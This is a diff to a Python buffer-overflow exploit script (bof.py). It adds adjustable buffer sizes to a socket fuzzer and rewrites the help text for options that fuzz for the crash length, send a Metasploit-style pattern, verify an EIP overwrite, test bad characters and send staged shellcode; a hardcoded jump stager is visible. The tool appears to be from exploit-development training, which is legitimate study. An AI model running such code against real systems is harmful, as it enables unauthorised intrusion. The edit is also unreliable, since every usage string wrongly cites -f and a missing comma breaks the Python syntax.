@@ -8,13 +8,13 @@ def replace_payload(term, payload, inputBuffer):
     new_payload = payload.replace(bytes(term), bytes(inputBuffer))
     return new_payload.strip('\n')
 
-def fuzz_find_buf_len(ip, port, payload):
+def fuzz_find_buf_len(ip, port, payload, start_size, end_size):
     server = ip
     sport = port
         
-    size = 3000
+    size = start_size
 
-    while(size <= 5000):
+    while(size <= end_size):
         inputBuffer = "A" * int(size)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         connect = s.connect((server, int(sport)))
@@ -84,7 +84,7 @@ def send_payload(ip, port, options):
         stager = "\x83\xc0\x0c\xff\xe0\x90\x90"
 
         if(options.fuzz != None):
-            fuzz_find_buf_len(ip, port, payload)
+            fuzz_find_buf_len(ip, port, payload, options.fuzz[0], options.fuzz[1])
             return
 
         if(options.fuzzpattern != None):
@@ -143,20 +143,20 @@ if len(sys.argv) <= 2:
 #fuzz_find_buf_len(sys.argv[1], sys.argv[2])
 usage = "usage: %prog [options] arg1 arg2"
 parser = OptionParser(usage=usage)
-parser.add_option("-f", "--fuzz", dest="fuzz",
-                  help="Fuzz for length of buffer", action="store_false")
+parser.add_option("-f", "--fuzz", dest="fuzz", type="int", nargs=2
+                  help="Fuzz for length of buffer. Run with ./bof.py <ip> <port> -f <start_size> <end_size>", action="store")
 parser.add_option("-p", "--fuzz-with-pattern",
                   action="store", dest="fuzzpattern",
-                  help="Supply length of msf pattern")
+                  help="Supply length of msf pattern. Run with ./bof.py <ip> <port> -f <length-for-msf-patten>")
 parser.add_option("-v", "--verify",
                   action="store", dest="verifyeip", type="int", nargs=2,
-                  help="Verify EIP is being overwritten with B's")
+                  help="Verify EIP is being overwritten with B's. Run with ./bof.py <ip> <port> -f <filler_len> <buffer_len>")
 parser.add_option("-t", "--test-bad-characters",
                   action="store", dest="testbadchars", type="int", nargs=2,
-                  help="Test bad characters. Supply length of filler buffer and buffer length and if it is staged or not")
+                  help="Test bad characters. Add -g to specify a staged payload. Run with ./bof.py <ip> <port> -f <filler_len> <buffer_len>")
 parser.add_option("-s", "--send-payload",
                   action="store", dest="sendpayload", type="int", nargs=2,
-                  help="Send shellcode payload to target. Supply length of filler buffer and offset length" )
+                  help="Send shellcode payload to target. Run with ./bof.py <ip> <port> -f <filler_len> <offset_len>" )
 parser.add_option("-g", "--send-stage-payload",
                   action="store_false", dest="stagedbuffer",
                   help="Set this flag if you're sending a staged payload" )
